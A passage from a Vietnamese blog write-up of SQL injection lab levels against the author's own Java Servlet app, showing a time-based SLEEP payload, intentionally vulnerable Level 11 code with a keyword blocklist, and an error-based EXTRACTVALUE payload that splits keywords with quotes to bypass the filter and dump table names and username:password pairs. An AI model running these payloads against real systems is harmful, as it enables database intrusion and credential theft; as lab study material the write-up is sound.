+<tr>
+<td><code>(SELECT SLEEP(5) WHERE (...))</code></td>
+<td>Nếu điều kiện <code>(...)</code> đúng, thì <code>SLEEP(5)</code> sẽ thực thi (tức là <strong>server delay 5 giây</strong>)</td>
+</tr>
+<tr>
+<td><code>SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()</code></td>
+<td>Đếm số bảng (<code>table</code>) trong schema (CSDL) hiện tại.</td>
+</tr>
+<tr>
+<td><code>&lt; 3</code></td>
+<td>Kiểm tra xem số bảng hiện tại có ít hơn 3 hay không.</td>
+</tr>
+<tr>
+<td><code>= &#39;&#39;</code></td>
+<td>So sánh với chuỗi rỗng, mục đích là để giữ cú pháp SQL hợp lệ.</td>
+</tr>
+</tbody></table>
+<p><img src="https://hackmd.io/_uploads/Byr7C5iweg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r16m0qiPxl.png" alt="image"></p>
+<p>Thời gian trả về trên khẳng định rằng có ít hơn 3 bảng trong database.</p>
+<p><img src="https://hackmd.io/_uploads/BJkO09sDxe.png" alt="image"></p>
+<p>Thử với bé hơn 2 và bé hơn 1 cho thời gian trả về rất nhanh nghĩa là có khả năng nó bằng 2 hoặc là nó bằng 1 bảng bây giờ ta thử với bằng 2 xem thế nào.</p>
+<p><img src="https://hackmd.io/_uploads/ryLPZiovll.png" alt="image"></p>
+<p>Thử với bằng 2 và khẳng định được có 2 bảng nằm trong database.<br>Với lỗi này nếu mình lợi dụng thêm script để brute thì ta hoàn toàn có thể dump ra được thông tin trong bảng ra.</p>
+<h4 id="Level-11-Filter-het-cac-ham-da-su-dung"><a href="#Level-11-Filter-het-cac-ham-da-su-dung" class="headerlink" title="Level 11: Filter hết các hàm đã sử dụng"></a>Level 11: Filter hết các hàm đã sử dụng</h4>  <summary>SQL Injection Level 11</summary>
+  Ở challenge này thì các hàm đã được sử dụng bên trên đã bị chặn đi bây giờ ta phải tìm hướng đi khác để có thể bypass được.
+    
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">User</span> loginLevel11(String username, String password) throws Exception &#123;</span><br><span class="line">       String[] sqlKeywords <span class="operator">=</span> &#123;</span><br><span class="line">               &quot;union&quot;, &quot;select&quot;, &quot;from&quot;, &quot;insert&quot;, &quot;update&quot;, &quot;delete&quot;,</span><br><span class="line">               &quot;drop&quot;, &quot;create&quot;, &quot;alter&quot;, &quot;order by&quot;, &quot;group by&quot;, &quot;having&quot;,</span><br><span class="line">               &quot;where&quot;, &quot;or&quot;, &quot;and&quot;, &quot;exec&quot;, &quot;execute&quot;, &quot;sp_&quot;, &quot;xp_&quot;, &quot;case&quot;, &quot;when&quot;, &quot;ascii&quot;, &quot;substring&quot;, &quot;then&quot;,</span><br><span class="line">               &quot;sleep&quot;, &quot;end&quot;</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       String usernameLower <span class="operator">=</span> username.toLowerCase();</span><br><span class="line">       String passwordLower <span class="operator">=</span> password.toLowerCase();</span><br><span class="line"></span><br><span class="line">       System.out.println(&quot;DEBUG: usernameLower = &quot; <span class="operator">+</span> usernameLower);</span><br><span class="line">       System.out.println(&quot;DEBUG: passwordLower = &quot; <span class="operator">+</span> passwordLower);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> (String keyword : sqlKeywords) &#123;</span><br><span class="line">           if (usernameLower.contains(keyword) <span class="operator">||</span> passwordLower.contains(keyword)) &#123;</span><br><span class="line">               throw <span class="keyword">new</span> Exception(&quot;SQLI detected (matched keyword: &quot; <span class="operator">+</span> keyword <span class="operator">+</span> &quot;)&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       username <span class="operator">=</span> username.replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;<span class="string">&#x27;&quot;, &quot;&quot;);</span></span><br><span class="line"><span class="string">       password = password.replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;&#x27;</span>&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">       String query = &quot;<span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span>\&quot;&quot; <span class="operator">+</span> username <span class="operator">+</span></span><br><span class="line">               &quot;\&quot; <span class="keyword">AND</span> password<span class="operator">=</span>MD5(\&quot;&quot; <span class="operator">+</span> password <span class="operator">+</span> &quot;\&quot;)&quot;;</span><br><span class="line"></span><br><span class="line">       System.out.println(&quot;DEBUG: Executing query <span class="operator">=</span> &quot; + query);</span><br><span class="line">       lastQuery = query;</span><br><span class="line"></span><br><span class="line">       try (Connection conn = DBConnection.getConnection();</span><br><span class="line">            Statement stmt = conn.createStatement();</span><br><span class="line">            ResultSet rs = stmt.executeQuery(query)) &#123;</span><br><span class="line"></span><br><span class="line">           if (rs.next()) &#123;</span><br><span class="line">               return new User(rs.getString(1), rs.getString(2));</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return null;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<h5 id="Huong-tiep-can-Error-Based"><a href="#Huong-tiep-can-Error-Based" class="headerlink" title="Hướng tiếp cận Error Based"></a>Hướng tiếp cận Error Based</h5><p>Sau một lúc thì tôi muốn thử cách error base xem liệu có lấy ra được cái gì trong mysql không vậy nên tiến hành tìm và sửa payload để hợp với cách tấn công dùng backslash để có thể escape và truyền payload vào.</p>
+<p>Ở đây tôi sử dụng payload là:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username <span class="operator">=</span> \</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password<span class="operator">=</span> <span class="operator">||</span> EXTRACTVALUE(<span class="number">1</span>, CONCAT(<span class="number">0x7e</span>, DATABASE(), <span class="number">0x7e</span>))#</span><br></pre></td></tr></table></figure>
+<p>Từng thành phần</p>
+<p><code>||</code><br>Trong MySQL, đây là toán tử OR (tương tự OR).<br><code>Ví dụ: 1 || 0 = 1</code><br>Payload dùng || để nối thêm điều kiện luôn true hoặc ép chạy thêm biểu thức.</p>
+<p><code>EXTRACTVALUE(1, CONCAT(...))</code><br>Đây là XML function trong MySQL (từ bản 5.x).</p>
+<p><code>EXTRACTVALUE(xml_document, xpath_string)</code><br>Nó parse XML → nhưng nếu xpath_string chứa ký tự đặc biệt hoặc chuỗi dài, MySQL sẽ trả về error có chứa chuỗi đó.<br>&#x3D;&gt; Đây là trick để in ra dữ liệu (error-based SQLi).</p>
+<p><code>CONCAT(0x7e, DATABASE(), 0x7e)</code><br>0x7e &#x3D; ký tự ~<br>DATABASE() &#x3D; tên database hiện tại<br>CONCAT(0x7e, DATABASE(), 0x7e) &#x3D; ghép chuỗi</p>
+<p><img src="https://hackmd.io/_uploads/BJLgQuNKlx.png" alt="image"></p>
+<p>Ở đây có thể thấy error trả về cho ta được tên bảng nhưng có vẻ hướng đi này vẫn đang rơi vào ngõ cụt vì sử dụng những hàm như này không có select sẽ không thể dump ra được thông tin của bảng khác hoặc thông tin trong bảng. Nhưng liệu SELECT có thực sự bị chặn? Sau khi đọc kỹ lại phần code thì ta để ý lại đoạn:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username <span class="operator">=</span> username.replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;<span class="string">&#x27;&quot;, &quot;&quot;);</span></span><br><span class="line"><span class="string">password = password.replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;&#x27;</span>&quot;, &quot;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>Nó sẽ chỉ replace dấu <code>&#39;&#39;</code> cùng với dấu <code>&quot;&quot;</code> để nó biến thành mỗi whitespace vậy nên ta có thể lợi dụng nó bằng cách viết kiểu <code>SEL&#39;ECT</code> điều này sẽ vừa giúp ta tránh được filter mà khi cái dấu biến mất nó sẽ được parse thành một chữ <code>SELECT</code> hoàn chỉnh tương tự với các chữ khác bị filter ta vẫn có thể làm được. Vậy giờ ta sẽ lợi dụng Error Based bằng cách dùng <code>EXTRACTVALUE</code> với <code>SELECT</code> để nó error ra các thông tin trong bảng.<br>Từ bước ở trên ta đã tìm được tên của Database ta sẽ dùng nó để đọc thông tin tiếp theo.</p>
+<p><img src="https://hackmd.io/_uploads/rk08WoItle.png" alt="image"></p>
+<p>Thành công dump ra được danh sách bảng có trong database sqli_lab.</p>
+<ul>
+<li><code>extractvalue(1, ...)</code>: Trích xuất dữ liệu từ một kết quả SQL.</li>
+<li><code>concat(0x7e, ...)</code>: Nối ký tự ~ (tương đương với 0x7e) vào trước và sau kết quả.</li>
+<li><code>select group_concat(table_name)</code>: Lấy tất cả tên bảng trong cơ sở dữ liệu sqli_lab và nối chúng lại thành một chuỗi.</li>
+<li><code>from information_schema.tables where table_schema=&#39;sqli_lab&#39;</code>: Truy vấn bảng hệ thống information_schema.tables để lấy tên bảng trong cơ sở dữ liệu sqli_lab.</li>
+</ul>
+<p>Ở đây có thể thấy trong database có 2 bảng là users với posts. Bây giờ ta thử đọc username password 1 user trong bảng users.</p>
+<p><img src="https://hackmd.io/_uploads/BJ7vVi8Fxx.png" alt="image"></p>
+<ul>
+<li><code>extractvalue(1, ...)</code>: Trích xuất giá trị từ câu truy vấn SQL được thực thi, có thể giúp hiển thị kết quả dưới dạng XML hoặc dữ liệu.</li>
+<li><code>concat(0x7e, ...)</code>: Nối ký tự ~ (tương đương với 0x7e) vào trước và sau kết quả, giúp dễ phân biệt dữ liệu trả về.</li>
+<li><code>select group_concat(username, 0x3a, password separator 0x2c)</code>:</li>
+<li>Trích xuất các cặp username:password từ bảng users.</li>
+<li><code>0x3a</code> là mã hex cho dấu : (dùng để phân tách tên người dùng và mật khẩu).</li>
+<li><code>separator 0x2c</code> sẽ phân tách các cặp username:password bằng dấu phẩy (,) giữa mỗi cặp.</li>
+<li><code>from users</code>: Truy vấn từ bảng users chứa thông tin về tài khoản.</li>
+<li></li>
+</ul>
+<p>Vậy là ta đã thành công dump thông tin dựa vào cách lợi dụng lớp phòng thủ tưởng chừng như an toàn trước attacker kết hợp với đó là Error Based sqli.</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-09-09-Servlet-Sql-Injection/">https://pzhat.github.io/2025/11/15/2025-09-09-Servlet-Sql-Injection/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/15/2025-09-09-THM-EvilGPT/" title="Tryhackme EvilGPT challenge WriteUp by @phatmh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Tryhackme EvilGPT challenge WriteUp by @phatmh</div></div><div class="info-2"><div class="info-item-1">Tryhackme EvilGPT challenge WriteUp by @phatmhDùng netcat để tiến hành kết nối với chall và tiến hành LLM Inject để có thể moi được flag từ con AI.Sau khi test thử thì đây không phải con AI bình thường như tôi nghĩ mà nó là một con AI thực thi các câu lệnh OS vậy bây giờ tiến hành thử moi ra các thứ có trong server.Tiến hành đọc thử source code của con AI xem nó có những cái gì. Tóm tắt chức năngTập tin Python evilai.py là một server Telnet đơn giản. Khi người dùng kết nối, nó: Nhận yêu cầu t...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Cmdi/" title="Java Servlet Command Injection Vulnerability Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Java Servlet Command Injection Vulnerability Challenges</div></div><div class="info-2"><div class="info-item-1">Java Servlet Command Injection Vulnerability ChallengesCấu trúc Project Cấu trúc Project   1234567891011121314151617181920212223242526272829303132333435+---.idea+---.mvnª   +---wrapper+---srcª   +---mainª   ª   +---javaª   ª   ª   +---ciª   ª   ª       +---controllerª   ª   ª       +---serviceª   ª   ª       +---utilª   ª   +---resourcesª   ª   ª   +---META-INFª   ª   +---webappª   ª       +---WEB-INFª   +---testª       +---javaª       +---resources+---target    +---classes    ª   +---ci    ª...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-FileUpload-Servlet/" title="Java Servlet FileUpload Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet FileUpload Vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet FileUpload Vulnerability by @PhatmhLỗ hổng File UploadBản chất của File Upload: File Upload đối với tôi nó đơn giản chỉ là lợidụng Unsafe Method để truyền một Untrusted Data vào nhằm thay đổi hànhvi của hệ thống trong trường hợp này là Web App, với FileUpload những gìUser Upload lên sẽ chính là Untrusted Data và với Feature Upload Filenhư này sẽ thế nào nếu nó không được Validate một cách cẩn thận ta sẽđến với DEMO bằng Java Servlet. Web App OverviewĐây là một Web App được dựng v...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Cmdi/" title="Java Servlet Command Injection Vulnerability Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Command Injection Vulnerability Challenges</div></div><div class="info-2"><div class="info-item-1">Java Servlet Command Injection Vulnerability ChallengesCấu trúc Project Cấu trúc Project   1234567891011121314151617181920212223242526272829303132333435+---.idea+---.mvnª   +---wrapper+---srcª   +---mainª   ª   +---javaª   ª   ª   +---ciª   ª   ª       +---controllerª   ª   ª       +---serviceª   ª   ª       +---utilª   ª   +---resourcesª   ª   ª   +---META-INFª   ª   +---webappª   ª       +---WEB-INFª   +---testª       +---javaª       +---resources+---target    +---classes    ª   +---ci    ª...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-16-WebSec.fr-level28/" title="WebSec.fr Level 28 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr Level 28 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr Level 28 CTF challengeTổng quan: 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123;  if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123;    die(&#x27;Your file is too heavy.&#x27;);  &#125;  $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;;  $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;);  $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/" title="CyberCon 2025 SafeUpload Web Challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CyberCon 2025 SafeUpload Web Challenge</div></div><div class="info-2"><div class="info-item-1">CyberCon 2025 SafeUpload Web ChallengeTổng quan challenge Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload. Tiến hành thử upload lên file php với nội dung: 123&lt;?phpecho &quot;test&quot;;?&gt;   Có vẻ như đã dính filter của bài có thể thấy nó đã xoá đi file mình upload lên, bây giờ ta thử upload 1 file php nhưng không có nội dung.  Vẫn là file đó nhưng không có nội dung thì hoàn toàn có thể upload bình t...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)Đây là một Website có chức năng là nslookup sử dụng hàm shell_exec của php để thực thi. Ta tiến hành truy cập để xem giao diện của web app.Ở đây ta thấy nó khá là basic khi chỉ có duy nhất một nơi có chức năng nslookup và bên cạnh là source code cho sẵn của chall, ta sẽ tiến hành phân tích source code được cấp sẵn. Ở ngay đầu tiên ta gặp khởi tạo và include file design và tạo object ($design) có tên là NSLookup Tool. Đến với nh...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">A blog about cybersecurity, hacking, pentesting, red teaming and more.</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-Servlet-Sql-Injection-Vulnerability-by-Phatmh"><span class="toc-number">1.</span> <span class="toc-text">Java Servlet Sql Injection Vulnerability by @Phatmh</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan-cau-truc-file-java"><span class="toc-number">1.1.</span> <span class="toc-text">Tổng quan cấu trúc file java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code-Github"><span class="toc-number">1.2.</span> <span class="toc-text">Source Code (Github)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tien-hanh-phan-tich-cach-level-va-POC"><span class="toc-number">1.3.</span> <span class="toc-text">Tiến hành phân tích cách level và POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-3"><span class="toc-number">1.3.3.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-4"><span class="toc-number">1.3.4.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-5"><span class="toc-number">1.3.5.</span> <span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-6"><span class="toc-number">1.3.6.</span> <span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-7"><span class="toc-number">1.3.7.</span> <span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-8"><span class="toc-number">1.3.8.</span> <span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-9"><span class="toc-number">1.3.9.</span> <span class="toc-text">Level 9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tien-hanh-test-thu-payload-va-debug"><span class="toc-number">1.3.10.</span> <span class="toc-text">Tiến hành test thử payload và debug</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-10"><span class="toc-number">1.3.11.</span> <span class="toc-text">Level 10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bonus-Level-10"><span class="toc-number">1.3.12.</span> <span class="toc-text">Bonus Level 10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-11-Filter-het-cac-ham-da-su-dung"><span class="toc-number">1.3.13.</span> <span class="toc-text">Level 11: Filter hết các hàm đã sử dụng</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Huong-tiep-can-Error-Based"><span class="toc-number">1.3.13.1.</span> <span class="toc-text">Hướng tiếp cận Error Based</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-03-I.redteam-Kerberoasting/" title="Ired.Team Kerberoasting (Credential Access)">Ired.Team Kerberoasting (Credential Access)</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-I.redteam-Kerberos-Golden-Ticket/" title="Ired.Team Kerberos Golden Tickets Lab">Ired.Team Kerberos Golden Tickets Lab</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-04-THM-Basic-Pentesting/" title="Tryhackme Basic Pentesting Challenge">Tryhackme Basic Pentesting Challenge</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-Ysoserial-CC5/" title="Ysoserial Commons Collections 5 Analyst">Ysoserial Commons Collections 5 Analyst</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/" title="PortSwigger CSRF Challenge WriteUps">PortSwigger CSRF Challenge WriteUps</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>
